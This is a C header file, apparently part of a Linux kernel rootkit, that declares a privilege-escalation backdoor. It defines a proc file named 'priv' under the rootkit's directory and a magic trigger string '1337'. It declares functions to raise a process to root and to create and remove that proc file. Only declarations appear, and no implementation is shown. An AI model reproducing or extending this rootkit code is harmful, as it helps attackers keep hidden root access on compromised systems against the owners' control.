#ifndef PRIV_ESCALATE
#define PRIV_ESCALATE
#include "rootkit.h" 

#define PRIV_ESCALATE_PROC_FILE "priv"
#define PRIV_ESCALATE_PROC_PATH ROOT_PROC_DIR "/" PRIV_ESCALATE_PROC_FILE
#define PRIV_ESCALATE_FILE_BUFF_SIZE 0x8
#define PRIV_ESCALATE_STRING "1337"

void escalate_process_root(void);
int  init_priv_escalate_proc_file(void);
void cleanup_priv_escalate_proc_file(void);

#endif